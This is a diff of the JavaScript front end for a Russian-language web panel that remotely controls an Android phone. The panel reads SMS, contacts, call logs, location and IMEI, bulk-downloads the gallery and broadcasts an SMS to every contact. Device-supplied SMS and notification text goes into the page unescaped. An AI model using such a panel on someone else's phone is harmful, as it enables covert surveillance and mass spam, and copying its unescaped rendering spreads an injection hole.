+    $('#batteryFill').style.width = pct + '%';
+    $('#batteryFill').style.background = pct < 20 ? 'var(--danger)' : 'var(--accent)';
+    $('#batteryText').textContent = pct + '%';
+    $('#batteryKv').innerHTML = `
+      <b>Статус</b><span>${b.status} (${b.plugged})</span>
+      <b>Температура</b><span>${b.temperature ?? '—'} °C</span>
+      <b>Напряжение</b><span>${b.voltage ?? '—'} мВ</span>
+      <b>Здоровье</b><span>${b.health ?? '—'}</span>`;
+  } catch (e) { $('#batteryKv').textContent = e.message; }
+}
+$('#refreshDash').onclick = loadDashboard;
+
+// ---------- Приложения ----------
+async function loadApps() {
+  const list = $('#appList');
+  list.innerHTML = '<li>Загрузка…</li>';
+  try {
+    const { apps } = await api('apps' + ($('#appsAll').checked ? '?all=1' : ''));
+    const filter = $('#appFilter').value.toLowerCase();
+    list.innerHTML = '';
+    for (const pkg of apps.filter((p) => p.includes(filter))) {
+      const li = document.createElement('li');
+      li.innerHTML = `<span class="name">${pkg}</span>`;
+      const launch = document.createElement('button');
+      launch.className = 'sm'; launch.textContent = '▶';
+      launch.onclick = () => jpost('apps/launch', { pkg }).then(() => toast('Запущено')).catch((e) => toast(e.message, true));
+      const stop = document.createElement('button');
+      stop.className = 'sm'; stop.textContent = '⏹';
+      stop.onclick = () => jpost('apps/stop', { pkg }).then(() => toast('Остановлено')).catch((e) => toast(e.message, true));
+      li.append(launch, stop);
+      list.appendChild(li);
+    }
+    if (!list.children.length) list.innerHTML = '<li>Ничего не найдено</li>';
+  } catch (e) { list.innerHTML = `<li>${e.message}</li>`; }
+}
+$('#refreshApps').onclick = loadApps;
+$('#appFilter').addEventListener('input', () => { clearTimeout(loadApps._t); loadApps._t = setTimeout(loadApps, 250); });
+$('#appsAll').onchange = loadApps;
+
+// ---------- Файлы ----------
+async function loadFiles(p) {
+  const list = $('#fileList');
+  if (!list) return;
+  list.innerHTML = '<li>Загрузка…</li>';
+  try {
+    const { path, entries } = await api('files?path=' + encodeURIComponent(p));
+    const fp = $('#filePath'); if (fp) fp.value = path;
+    list.innerHTML = '';
+    for (const e of entries) {
+      const li = document.createElement('li');
+      if (e.isDir) li.className = 'dir';
+      const icon = e.isDir ? '📁' : '📄';
+      const name = document.createElement('span');
+      name.className = 'name';
+      name.textContent = `${icon} ${e.name}`;
+      if (e.isDir) name.onclick = () => loadFiles((path.replace(/\/$/, '')) + '/' + e.name);
+      li.appendChild(name);
+      if (!e.isDir) {
+        const sub = document.createElement('span'); sub.className = 'sub'; sub.textContent = e.size;
+        const dl = document.createElement('button');
+        dl.className = 'sm'; dl.textContent = '⬇';
+        dl.onclick = () => window.open('/api/files/download?path=' + encodeURIComponent((path.replace(/\/$/, '')) + '/' + e.name));
+        li.append(sub, dl);
+      }
+      list.appendChild(li);
+    }
+    if (!entries.length) list.innerHTML = '<li>Пусто</li>';
+  } catch (e) { list.innerHTML = `<li>${e.message}</li>`; }
+}
+if ($('#goPath')) $('#goPath').onclick = () => loadFiles($('#filePath').value);
+if ($('#upPath')) $('#upPath').onclick = () => {
+  const p = $('#filePath').value.replace(/\/$/, '');
+  loadFiles(p.substring(0, p.lastIndexOf('/')) || '/');
+};
+if ($('#uploadBtn')) $('#uploadBtn').onclick = async () => {
+  const f = $('#uploadInput').files[0];
+  if (!f) return toast('Выбери файл', true);
+  const fd = new FormData();
+  fd.append('file', f);
+  fd.append('remoteDir', $('#filePath').value);
+  try {
+    const r = await fetch('/api/files/upload', { method: 'POST', body: fd });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error);
+    toast('Загружено: ' + d.remotePath);
+    loadFiles($('#filePath').value);
+  } catch (e) { toast(e.message, true); }
+};
+
+// ---------- Уведомления ----------
+async function loadNotifs() {
+  const list = $('#notifList');
+  list.innerHTML = '<li>Загрузка…</li>';
+  try {
+    const { items } = await api('notifications');
+    list.innerHTML = '';
+    for (const n of items) {
+      const li = document.createElement('li');
+      li.innerHTML = `<div class="name"><b>${n.title || '(без заголовка)'}</b><div class="sub">${n.pkg}</div>${n.text ? '<div>' + n.text + '</div>' : ''}</div>`;
+      list.appendChild(li);
+    }
+    if (!items.length) list.innerHTML = '<li>Нет уведомлений (или устройство их не отдаёт)</li>';
+  } catch (e) { list.innerHTML = `<li>${e.message}</li>`; }
+}
+$('#refreshNotifs').onclick = loadNotifs;
+$('#postNotif').onclick = () => jpost('notifications/post', { title: $('#notifTitle').value, text: $('#notifText').value })
+  .then(() => toast('Отправлено')).catch((e) => toast(e.message, true));
+
+// ---------- Звонки / Телефон ----------
+let wsPhone = null;
+
+function startCallsViewer(requestDataOnOpen) {
+  if (wsPhone && wsPhone.readyState < 2) return;
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  wsPhone = new WebSocket(`${proto}://${location.host}/phone?role=viewer`);
+  wsPhone.binaryType = 'arraybuffer';
+  wsPhone.onopen = () => {
+    $('#callsStatus').textContent = 'ожидание телефона…';
+    $('#callsStatus').classList.remove('on');
+    if (requestDataOnOpen) {
+      phoneSend({ cmd: 'get-phone-info' });
+      phoneSend({ cmd: 'get-call-log' });
+      phoneSend({ cmd: 'get-contacts' });
+      phoneSend({ cmd: 'get-system-info' });
+      phoneSend({ cmd: 'get-volume' });
+      phoneSend({ cmd: 'get-gallery-stats' });
+    }
+  };
+  wsPhone.onmessage = (ev) => {
+    if (ev.data instanceof ArrayBuffer) { _handleBinaryChunk(ev.data); return; }
+    if (typeof ev.data !== 'string') return;
+    try {
+      const m = JSON.parse(ev.data);
+      if (m.type === 'phone-connected') {
+        if (m.connected) {
+          $('#callsStatus').textContent = 'подключён';
+          $('#callsStatus').classList.add('on');
+        } else {
+          $('#callsStatus').textContent = 'телефон не подключён';
+          $('#callsStatus').classList.remove('on');
+        }
+      } else if (m.type === 'phone-info') {
+        renderPhoneInfo(m);
+      } else if (m.type === 'call-log') {
+        renderCallLog(m.entries || []);
+      } else if (m.type === 'call-log-error') {
+        $('#callLogBody').innerHTML = `<tr><td colspan="4" style="color:var(--danger)">${m.msg || 'Ошибка'}</td></tr>`;
+      } else if (m.type === 'contacts') {
+        renderContacts(m.entries || []);
+      } else if (m.type === 'contacts-error') {
+        $('#contactList').innerHTML = `<li style="color:var(--danger)">${m.msg || 'Ошибка'}</li>`;
+      } else if (m.type === 'call-status') {
+        toast(m.msg || (m.ok ? 'Звонок отправлен' : 'Ошибка'), !m.ok);
+      } else if (m.type === 'sms-list') {
+        renderSmsList(m.messages || []);
+      } else if (m.type === 'sms-error') {
+        $('#smsList').innerHTML = `<p style="color:var(--danger);padding:10px">${m.msg || 'Ошибка'}</p>`;
+      } else if (m.type === 'sms-status') {
+        toast(m.msg || (m.ok ? 'Отправлено' : 'Ошибка'), !m.ok);
+        showSmsStatus(m.ok, m.msg || (m.ok ? 'Отправлено' : 'Ошибка'));
+        if (m.ok) { $('#smsText').value = ''; phoneSend({ cmd: 'get-sms' }); }
+      } else if (m.type === 'sms-incoming') {
+        injectIncomingSms(m);
+        toast(`📩 СМС от ${m.name || m.address}`);
+        // badge на вкладке СМС если она сейчас не активна
+        if (!document.querySelector('.tab[data-tab="sms"]')?.classList.contains('active')) {
+          const badge = $('#smsBadge');
+          if (badge) { badge.style.display = ''; badge.textContent = parseInt(badge.textContent || '0') + 1; }
+        }
+      } else if (m.type === 'sms-broadcast-progress') {
+        const done = m.sent + m.failed;
+        const pct = m.total > 0 ? Math.round(done / m.total * 100) : 0;
+        $('#broadcastFill').style.width = pct + '%';
+        if (!m.current) {
+          $('#broadcastStatus').textContent = `Контактов найдено: ${m.total}`;
+          $('#broadcastCount').textContent = m.total;
+        } else {
+          $('#broadcastStatus').textContent = `${done} / ${m.total} — ${m.current}`;
+          // Добавляем строку в список результатов
+          const log = $('#broadcastLog');
+          if (log) {
+            const row = document.createElement('div');
+            row.className = 'bc-row ' + (m.ok ? 'bc-ok' : 'bc-fail');
+            row.innerHTML = `<span class="bc-icon">${m.ok ? '✓' : '✗'}</span><span class="bc-name">${m.current}</span><span class="bc-num">${m.number || ''}</span>${m.ok ? '' : `<span class="bc-err">${m.err || ''}</span>`}`;
+            log.appendChild(row);
+            log.scrollTop = log.scrollHeight;
+          }
+        }
+      } else if (m.type === 'system-info') {
+        renderSystemInfo(m);
+      } else if (m.type === 'volume-info') {
+        renderVolumeInfo(m.streams || {});
+      } else if (m.type === 'bluetooth-status') {
+        if (!m.ok && m.msg) toast('Bluetooth: ' + m.msg, true);
+        else { setToggleBtn($('#cmdBtToggle'), m.enabled); toast(m.enabled ? '🔵 Bluetooth включён' : 'Bluetooth выключен'); }
+      } else if (m.type === 'torch-status') {
+        if (!m.ok && m.msg) toast('Фонарик: ' + m.msg, true);
+        else { setToggleBtn($('#cmdTorchToggle'), m.enabled); toast(m.enabled ? '🔦 Фонарик включён' : 'Фонарик выключен'); }
+      } else if (m.type === 'location') {
+        renderLocation(m);
+      } else if (m.type === 'gallery-items') {
+        renderGalleryItems(m);
+      } else if (m.type === 'gallery-folders') {
+        renderGalleryFolders(m);
+      } else if (m.type === 'media-thumb') {
+        applyMediaThumb(m);
+      } else if (m.type === 'calendar-events') {
+        renderCalendar(m);
+      } else if (m.type === 'gallery-stats') {
+        renderGalleryStats(m);
+      } else if (m.type === 'bulk-start') {
+        _bulkState = { total: m.total, done: 0, totalBytes: m.totalBytes || 0, bytesDone: 0 };
+        _bulkZip = new JSZip(); _bulkZipPart = 0; _bulkZipSize = 0;
+        const cb = $('#dlCancelBtn'); if (cb) cb.style.display = '';
+        ['dlAllBtn','dlPhotosBtn','dlVideosBtn'].forEach((id) => { const el = $('#' + id); if (el) el.disabled = true; });
+        _updateBulkProgress();
+      } else if (m.type === 'bulk-progress') {
+        if (_bulkState) { _bulkState.done = m.done; _updateBulkProgress(); }
+      } else if (m.type === 'bulk-done') {
+        _bulkState = null;
+        const cb = $('#dlCancelBtn'); if (cb) cb.style.display = 'none';
+        ['dlAllBtn','dlPhotosBtn','dlVideosBtn'].forEach((id) => { const el = $('#' + id); if (el) el.disabled = false; });
+        if (m.cancelled) { toast('Загрузка отменена'); if (_bulkZip && _bulkZipSize > 0) _flushZipAsync(); _bulkZip = null; }
+        else if (m.err) { toast('Ошибка: ' + m.err, true); _bulkZip = null; }
+        else {
+          if (_bulkZip && _bulkZipSize > 0) _flushZipAsync();
+          else toast(`✓ Скачано ${m.done} файлов`);
+          _bulkZip = null;
+        }
+        const area = $('#bulkProgressArea');
+        if (area) setTimeout(() => { if (!_bulkState) area.style.display = 'none'; }, 4000);
+      } else if (m.type === 'file-chunk') {
+        if (m.err) { toast('Ошибка: ' + m.err, true); _fileDl.delete(m.requestId); return; }
+        let dl = _fileDl.get(m.requestId);
+        if (!dl) {
+          dl = { chunks: [], name: m.name, mime: m.mime, total: m.total, size: m.size || 0, startTs: Date.now(), bytesGot: 0 };
+          _fileDl.set(m.requestId, dl);
+        }
+        dl.chunks[m.index] = m.data;
+        const chunkBytes = m.data ? Math.round(m.data.length * 3 / 4) : 0;
+        dl.bytesGot += chunkBytes;
+        _trackSpeed(chunkBytes);
+        const got = dl.chunks.filter(Boolean).length;
+        const pct = Math.round(got / dl.total * 100);
+        const spd = _currentSpeedBps();
+        const remaining = spd > 0 && dl.size > 0 ? (dl.size - dl.bytesGot) / spd : 0;
+        const spdStr = _fmtSpeed(spd);
+        const etaStr = _fmtEta(remaining);
+        const info = [spdStr, etaStr].filter(Boolean).join(' · ');
+        toast(`⬇ ${dl.name} — ${pct}%${info ? ' · ' + info : ''}`, false, true);
+        if (got === dl.total) {
+          _fileDl.delete(m.requestId);
+          const parts = dl.chunks.map((c) => { const b = atob(c); const u = new Uint8Array(b.length); for (let i = 0; i < b.length; i++) u[i] = b.charCodeAt(i); return u; });
+          const blob = new Blob(parts, { type: dl.mime || 'application/octet-stream' });
+          if (m.requestId && m.requestId.startsWith('bulk_')) {
+            if (_bulkState) _bulkState.bytesDone += dl.size || 0;
+            _addToBulkZip(dl.name || 'file', blob);
+          } else {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = dl.name || 'file';
+            document.body.appendChild(a); a.click(); document.body.removeChild(a);
+            setTimeout(() => URL.revokeObjectURL(url), 2000);
+            toast('✓ Скачан: ' + dl.name);
+          }
+        }
+      } else if (m.type === 'sms-broadcast-done') {
+        $('#broadcastBtn').disabled = false;
+        $('#broadcastBtn').textContent = '📢 Разослать';
+        $('#broadcastBtn').classList.remove('danger-btn');
+        if (m.ok) {
+          $('#broadcastFill').style.width = '100%';
+          $('#broadcastStatus').textContent = `✓ Отправлено: ${m.sent}, ошибок: ${m.failed}`;
+          toast(`Рассылка завершена: ${m.sent} отправлено`);
+        } else {
+          $('#broadcastStatus').textContent = `✗ ${m.msg}`;
+          toast(m.msg || 'Ошибка рассылки', true);
+        }
+      }
+    } catch {}
+  };
+  wsPhone.onclose = () => {
+    $('#callsStatus').textContent = 'нет соединения';
+    $('#callsStatus').classList.remove('on');
+    setTimeout(startCallsViewer, 3000);
+  };
+  wsPhone.onerror = () => {};
+}
+
+let allContacts = [];
+
+const PERM_DEFS = [
+  { key: 'camera',        icon: '📷', label: 'Камера' },
+  { key: 'mic',           icon: '🎤', label: 'Микрофон' },
+  { key: 'notifications', icon: '🔔', label: 'Уведомления' },
+  { key: 'accessibility', icon: '👆', label: 'Управление (Accessibility)' },
+  { key: 'projection',    icon: '🖥',  label: 'Захват экрана' },
+  { key: 'phone',         icon: '📞', label: 'Звонки и телефон' },
+  { key: 'contacts',      icon: '👥', label: 'Контакты' },
+  { key: 'sms',           icon: '💬', label: 'СМС' },
+  { key: 'btConnect',     icon: '🔵', label: 'Bluetooth' },
+  { key: 'location',      icon: '📍', label: 'Геолокация' },
+  { key: 'mediaImages',   icon: '🖼',  label: 'Фото (галерея)' },
+  { key: 'mediaVideo',    icon: '🎬', label: 'Видео (галерея)' },
+  { key: 'calendar',      icon: '📅', label: 'Календарь' },
+];
+
+function renderPhoneInfo(info) {
+  $('#callsStatus').textContent = 'подключён';
+  $('#callsStatus').classList.add('on');
+  const rows = [];
+  if (info.model) rows.push(`<b>Модель</b><span>${info.model}</span>`);
+  if (info.number) rows.push(`<b>Номер</b><span>${info.number}</span>`);
+  if (info.imei) rows.push(`<b>IMEI</b><span>${info.imei}</span>`);
+  if (info.operator) rows.push(`<b>Оператор</b><span>${info.operator}</span>`);
+  if (info.networkType) rows.push(`<b>Сеть</b><span>${info.networkType}</span>`);
+  $('#phoneInfoKv').innerHTML = rows.length ? rows.join('') : '—';
+  const simsEl = $('#simsKv');
+  if (info.sims && info.sims.length) {
+    simsEl.innerHTML = info.sims.map((s) =>
+      `<b>SIM ${s.slot}</b><span>${s.displayName || s.carrierName}${s.number ? ' · ' + s.number : ''}</span>`
+    ).join('');
+  } else {
+    simsEl.innerHTML = '';
+  }
+  // Обновляем дашборд — батарея
+  if (info.battery != null) {
+    const pct = info.battery;
+    $('#batteryFill').style.width = pct + '%';
+    $('#batteryFill').style.background = pct < 20 ? 'var(--danger)' : pct < 40 ? '#f0a030' : 'var(--accent)';
+    $('#batteryText').textContent = pct + '%';
+    $('#batteryKv').innerHTML = `<b>Заряд</b><span>${pct}%</span>`;
+  }
+  // Обновляем дашборд — устройство
+  if (info.model) {
+    $('#infoKv').innerHTML = `<b>Модель</b><span>${info.model}</span>`
+      + (info.androidVersion ? `<b>Android</b><span>${info.androidVersion}</span>` : '')
+      + (info.operator ? `<b>Оператор</b><span>${info.operator}</span>` : '')
+      + (info.networkType ? `<b>Сеть</b><span>${info.networkType}</span>` : '');
+  }
+  // Обновляем дашборд — разрешения
+  const permsEl = $('#permsKv');
+  if (permsEl && info.perms) {
+    permsEl.innerHTML = PERM_DEFS.map((d) => {
+      const ok = info.perms[d.key];
+      return `<b>${d.icon} ${d.label}</b><span class="${ok ? 'perm-ok' : 'perm-no'}">${ok ? '✓ Разрешено' : '✗ Не выдано'}</span>`;
+    }).join('');
+  }
+}
+
+function renderContacts(entries) {
+  allContacts = entries;
+  filterContacts($('#contactSearch').value);
+}
+
+function filterContacts(q) {
+  const list = $('#contactList');
+  const query = (q || '').toLowerCase().trim();
+  const filtered = query
+    ? allContacts.filter((c) => c.name.toLowerCase().includes(query) || c.number.includes(query))
+    : allContacts;
+  if (!filtered.length) {
+    list.innerHTML = `<li style="color:var(--muted);padding:8px">${allContacts.length ? 'Не найдено' : 'Контакты пусты'}</li>`;
+    return;
+  }
+  list.innerHTML = filtered.map((c) =>
+    `<li class="contact-item">
+      <span class="contact-name">${c.name || c.number}</span>
+      <span class="contact-num">${c.name ? c.number : ''}</span>
+      <button class="sm contact-sms" data-num="${c.number}" data-name="${(c.name || '').replace(/"/g, '&quot;')}" title="Написать СМС">💬</button>
+      <button class="sm contact-call" data-num="${c.number}">📞</button>
+    </li>`
+  ).join('');
+  list.querySelectorAll('.contact-call').forEach((btn) => {
+    btn.onclick = () => phoneSend({ cmd: 'call', number: btn.dataset.num });
+  });
+  list.querySelectorAll('.contact-sms').forEach((btn) => {
+    btn.onclick = () => openSmsFor(btn.dataset.num, btn.dataset.name);
+  });
+}
+
+function renderCallLog(entries) {
+  const tbody = $('#callLogBody');
+  if (!entries.length) {
+    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--muted)">Журнал пуст</td></tr>';
+    return;
+  }
+  tbody.innerHTML = entries.map((e) => {
+    const typeLabel = e.callType === 'incoming' ? '📥 Вход'
+      : e.callType === 'outgoing' ? '📤 Исход'
+      : e.callType === 'missed' ? '📵 Пропущен' : '— Другое';
+    const name = e.name ? `${e.name}<small>${e.number}</small>` : e.number || '—';
+    const date = e.date ? new Date(e.date).toLocaleString('ru-RU', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : '';
+    const dur = e.duration > 0 ? `${Math.floor(e.duration / 60)}:${String(e.duration % 60).padStart(2, '0')}` : '—';
+    return `<tr><td class="type-${e.callType}">${typeLabel}</td><td>${name}</td><td>${date}</td><td>${dur}</td></tr>`;
+  }).join('');
+}
+
+function phoneSend(obj) {
+  if (wsPhone && wsPhone.readyState === WebSocket.OPEN) wsPhone.send(JSON.stringify(obj));
+}
+
+function startCallsTab() {
+  if (wsPhone && wsPhone.readyState === WebSocket.OPEN) {
+    phoneSend({ cmd: 'get-phone-info' });
+    phoneSend({ cmd: 'get-call-log' });
+    phoneSend({ cmd: 'get-contacts' });
+    phoneSend({ cmd: 'get-gallery-stats' });
+  } else {
+    startCallsViewer(true);
+  }
+}
+
+$('#callBtn').onclick = () => {
+  const num = $('#dialInput').value.trim();
+  if (!num) { toast('Введи номер', true); return; }
+  phoneSend({ cmd: 'call', number: num });
+};
+$('#dialInput').addEventListener('keydown', (e) => { if (e.key === 'Enter') $('#callBtn').click(); });
+$('#refreshCallLog').onclick = () => phoneSend({ cmd: 'get-call-log' });
+$('#refreshContacts').onclick = () => phoneSend({ cmd: 'get-contacts' });
+$('#contactSearch').addEventListener('input', (e) => filterContacts(e.target.value));
+
+// ---------- СМС ----------
+let pendingSmsFor = null; // { number, name } — открыть тред после загрузки списка
+
+function openSmsFor(number, name) {
+  pendingSmsFor = { number, name };
+  // Переключаем на вкладку СМС (как клик по табу)
+  document.querySelectorAll('.tab').forEach((t) => t.classList.toggle('active', t.dataset.tab === 'sms'));
+  document.querySelectorAll('.tab-content').forEach((c) => c.classList.toggle('active', c.id === 'tab-sms'));
+  startCallsTab();
+  phoneSend({ cmd: 'get-sms' });
+  // Если список уже загружен — сразу открываем тред
+  tryOpenPendingThread();
+}
+
+function tryOpenPendingThread() {
+  if (!pendingSmsFor) return;
+  const { number, name } = pendingSmsFor;
+  const addrEnc = encodeURIComponent(number);
+  const thread = $('#smsList').querySelector(`.sms-thread[data-addr="${addrEnc}"]`);
+  if (thread) {
+    pendingSmsFor = null;
+    thread.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    const msgs = thread.querySelector('.sms-messages');
+    if (msgs) msgs.style.display = 'block';
+    const input = thread.querySelector('.sms-inline-input');
+    if (input) setTimeout(() => input.focus(), 100);
+  } else {
+    // Тред не найден — заполняем поле «Кому» в форме отправки наверху
+    $('#smsTo').value = number;
+    pendingSmsFor = null;
+  }
+}
+
+function smsTimeStr(date) {
+  return new Date(date).toLocaleString('ru-RU', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+}
+
+function smsMsgHtml(m) {
+  return `<div class="sms-msg ${m.type === 2 ? 'sms-out' : 'sms-in'}">
+    <span class="sms-msg-body">${m.body || ''}</span>
+    <span class="sms-msg-time">${smsTimeStr(m.date)}</span>
+  </div>`;
+}
+
+function bindThreadEvents(el) {
+  const header  = el.querySelector('.sms-thread-header');
+  const preview = el.querySelector('.sms-preview');
+  const msgs    = el.querySelector('.sms-messages');
+  const sendBtn = el.querySelector('.sms-inline-send');
+  const input   = el.querySelector('.sms-inline-input');
+  [header, preview].forEach((h) => h.onclick = () => {
+    msgs.style.display = msgs.style.display === 'none' ? 'block' : 'none';
+    if (msgs.style.display === 'block') { msgs.scrollTop = msgs.scrollHeight; input && input.focus(); }
+  });
+  if (sendBtn && input) {
+    const addr = decodeURIComponent(el.dataset.addr);
+    const doSend = () => {
+      const text = input.value.trim();
+      if (!text) return;
+      phoneSend({ cmd: 'send-sms', number: addr, text });
+      input.value = '';
+    };
+    sendBtn.onclick = (e) => { e.stopPropagation(); doSend(); };
+    input.onkeydown = (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); doSend(); } };
+  }
+}
+
+function renderSmsList(messages) {
+  const container = $('#smsList');
+  if (!messages.length) {
+    container.innerHTML = '<p style="color:var(--muted);text-align:center;padding:20px">Нет сообщений</p>';
+    return;
+  }
+  const threads = {};
+  for (const m of messages) {
+    const addr = m.address || 'Неизвестный';
+    if (!threads[addr]) threads[addr] = [];
+    threads[addr].push(m);
+  }
+  const sorted = Object.entries(threads).sort(([, a], [, b]) => b[0].date - a[0].date);
+  container.innerHTML = sorted.map(([addr, msgs]) => {
+    const last = msgs[0];
+    const displayName = last.name || addr;
+    const preview = (last.body || '').slice(0, 70) + (last.body && last.body.length > 70 ? '…' : '');
+    const typeIcon = last.type === 2 ? '📤' : '📥';
+    const unread = msgs.filter((m) => m.type === 1 && !m.read).length;
+    const addrEnc = encodeURIComponent(addr);
+    return `<div class="sms-thread" data-addr="${addrEnc}">
+      <div class="sms-thread-header">
+        <span class="sms-addr">${displayName}</span>${displayName !== addr ? `<span class="sms-num">${addr}</span>` : ''}
+        ${unread ? `<span class="sms-unread">${unread}</span>` : ''}
+        <span class="sms-date">${relTime(last.date)}</span>
+      </div>
+      <div class="sms-preview">${typeIcon} ${preview}</div>
+      <div class="sms-messages" style="display:none">
+        <div class="sms-msgs-scroll">${msgs.map(smsMsgHtml).join('')}</div>
+        <div class="sms-inline-row">
+          <textarea class="sms-inline-input" placeholder="Текст…" rows="1"></textarea>
+          <button class="sms-inline-send">📤</button>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+  container.querySelectorAll('.sms-thread').forEach(bindThreadEvents);
+  tryOpenPendingThread();
+}
+
+function injectIncomingSms(m) {
+  const addr = m.address || 'Неизвестный';
+  const displayName = m.name || addr;
+  const addrEnc = encodeURIComponent(addr);
+  const container = $('#smsList');
+  let thread = container.querySelector(`.sms-thread[data-addr="${addrEnc}"]`);
+  if (thread) {
+    // добавить сообщение в существующий тред
+    const scroll = thread.querySelector('.sms-msgs-scroll');
+    if (scroll) {
+      scroll.insertAdjacentHTML('beforeend', smsMsgHtml({ ...m, type: 1 }));
+      scroll.scrollTop = scroll.scrollHeight;
+    }
+    // переместить тред наверх
+    container.prepend(thread);
+    // обновить превью и убрать badge
+    const unreadEl = thread.querySelector('.sms-unread');
+    if (unreadEl) unreadEl.textContent = parseInt(unreadEl.textContent || '0') + 1;
+    else thread.querySelector('.sms-thread-header').insertAdjacentHTML('afterbegin', `<span class="sms-unread" style="order:-1">1</span>`);
+    thread.querySelector('.sms-preview').textContent = '📥 ' + (m.body || '').slice(0, 70);
+    thread.querySelector('.sms-date').textContent = relTime(m.date);
+  } else {
+    // новый контакт — вставить тред наверх
+    const div = document.createElement('div');
+    div.className = 'sms-thread';
+    div.dataset.addr = addrEnc;
+    div.innerHTML = `
+      <div class="sms-thread-header">
+        <span class="sms-addr">${displayName}</span>${displayName !== addr ? `<span class="sms-num">${addr}</span>` : ''}
+        <span class="sms-unread">1</span>
+        <span class="sms-date">${relTime(m.date)}</span>
+      </div>
+      <div class="sms-preview">📥 ${(m.body || '').slice(0, 70)}</div>
+      <div class="sms-messages" style="display:none">
+        <div class="sms-msgs-scroll">${smsMsgHtml({ ...m, type: 1 })}</div>
+        <div class="sms-inline-row">
+          <textarea class="sms-inline-input" placeholder="Текст…" rows="1"></textarea>
+          <button class="sms-inline-send">📤</button>
+        </div>
+      </div>`;
+    container.prepend(div);
+    bindThreadEvents(div);
+  }
+}
+
+function showSmsStatus(ok, msg) {
+  const el = $('#smsSendStatus');
+  if (!el) return;
+  el.textContent = msg;
+  el.className = 'sms-send-status ' + (ok ? 'ok' : 'err');
+  clearTimeout(showSmsStatus._t);
+  if (ok) showSmsStatus._t = setTimeout(() => { el.textContent = ''; el.className = 'sms-send-status'; }, 3000);
+}
+
+// ---------- Массовая рассылка ----------
+let broadcastReady = false;
+
+$('#broadcastToggle').onclick = () => {
+  const body = $('#broadcastBody');
+  const chevron = $('#broadcastChevron');
+  const open = body.style.display === 'none';
+  body.style.display = open ? 'block' : 'none';
+  chevron.textContent = open ? '▲' : '▼';
+};
+
+$('#broadcastBtn').onclick = () => {
+  if (!broadcastReady) {
+    const text = $('#broadcastText').value.trim();
+    if (!text) { toast('Введи текст для рассылки', true); return; }
+    broadcastReady = true;
+    $('#broadcastWarn').style.display = 'block';
+    $('#broadcastCancelBtn').style.display = '';
+    $('#broadcastBtn').textContent = '✓ Подтвердить';
+    $('#broadcastBtn').classList.add('danger-btn');
+  } else {
+    const text = $('#broadcastText').value.trim();
+    if (!text) { toast('Введи текст для рассылки', true); return; }
+    broadcastReady = false;
+    $('#broadcastWarn').style.display = 'none';
+    $('#broadcastCancelBtn').style.display = 'none';
+    $('#broadcastBtn').textContent = '⏳ Отправка…';
+    $('#broadcastBtn').disabled = true;
+    $('#broadcastProgress').style.display = 'block';
+    $('#broadcastStatus').textContent = 'Подготовка…';
+    $('#broadcastLog').innerHTML = '';
+    phoneSend({ cmd: 'send-sms-broadcast', text });
+  }
+};
+
+$('#broadcastCancelBtn').onclick = () => {
+  broadcastReady = false;
+  $('#broadcastWarn').style.display = 'none';
+  $('#broadcastCancelBtn').style.display = 'none';
+  $('#broadcastBtn').textContent = '📢 Разослать';
+  $('#broadcastBtn').classList.remove('danger-btn');
+};
+
+$('#sendSmsBtn').onclick = () => {
+  const number = $('#smsTo').value.trim();
+  const text = $('#smsText').value.trim();
+  if (!number) { toast('Введи номер', true); return; }
+  if (!text) { toast('Введи текст', true); return; }
+  phoneSend({ cmd: 'send-sms', number, text });
+};
+$('#refreshSms').onclick = () => phoneSend({ cmd: 'get-sms' });
+
+// ---------- Команды ----------
+function loadCommandsTab() {
+  phoneSend({ cmd: 'get-system-info' });
+  phoneSend({ cmd: 'get-volume' });
+  if (_leafletMap) setTimeout(() => _leafletMap.invalidateSize(), 100);
+}
+
+function renderSystemInfo(m) {
+  const fmt = (b) => {
+    if (b == null) return '—';
+    const gb = b / 1024 / 1024 / 1024;
+    return gb >= 1 ? gb.toFixed(1) + ' ГБ' : (b / 1024 / 1024).toFixed(0) + ' МБ';
+  };
+  const rows = [];
+  if (m.ramTotal != null) {
+    const used = m.ramTotal - m.ramAvail;
+    rows.push(`<b>💾 RAM</b><span>${fmt(used)} / ${fmt(m.ramTotal)}</span>`);
+  }
+  if (m.storIntTotal != null) {
+    const used = m.storIntTotal - m.storIntFree;
+    rows.push(`<b>📦 Хранилище</b><span>${fmt(used)} / ${fmt(m.storIntTotal)}</span>`);
+  }
+  if (m.storExtTotal != null) {
+    const used = m.storExtTotal - m.storExtFree;
+    rows.push(`<b>📦 SD-карта</b><span>${fmt(used)} / ${fmt(m.storExtTotal)}</span>`);
+  }
+  if (m.batteryTemp != null) rows.push(`<b>🌡 Батарея</b><span>${m.batteryTemp.toFixed(1)} °C</span>`);
+  if (m.cpuTemp != null) rows.push(`<b>🌡 CPU</b><span>${m.cpuTemp.toFixed(1)} °C</span>`);
+  if (m.bluetoothEnabled != null) {
+    rows.push(`<b>🔵 Bluetooth</b><span>${m.bluetoothEnabled ? 'Включён' : 'Выключен'}</span>`);
+    setToggleBtn($('#cmdBtToggle'), m.bluetoothEnabled);
+  }
+  if (m.vpnActive != null) {
+    const vpnOn = m.vpnActive;
+    const iface = m.vpnIface ? ` (${m.vpnIface})` : '';
+    rows.push(`<b>🔒 VPN</b><span class="${vpnOn ? 'perm-ok' : 'perm-no'}">${vpnOn ? 'Активен' + iface : 'Не используется'}</span>`);
+  }
+  const el = $('#sysInfoKv');
+  if (el) el.innerHTML = rows.length ? rows.join('') : '<span style="color:var(--muted)">Нет данных</span>';
+}
+
+function renderVolumeInfo(streams) {
+  document.querySelectorAll('.vol-slider').forEach((sl) => {
+    const s = streams[sl.dataset.stream];
+    if (!s) return;
+    sl.max = s.max;
+    sl.value = s.current;
+    const val = sl.closest('.vol-row')?.querySelector('.vol-val');
+    if (val) val.textContent = `${s.current}/${s.max}`;
+  });
+}
+
+function setToggleBtn(btn, on) {
+  if (!btn) return;
+  btn.dataset.state = on ? 'on' : 'off';
+  btn.textContent = on ? 'Вкл' : 'Выкл';
+  btn.classList.toggle('on', on);
+}
+
+$('#cmdBtToggle').onclick = () => {
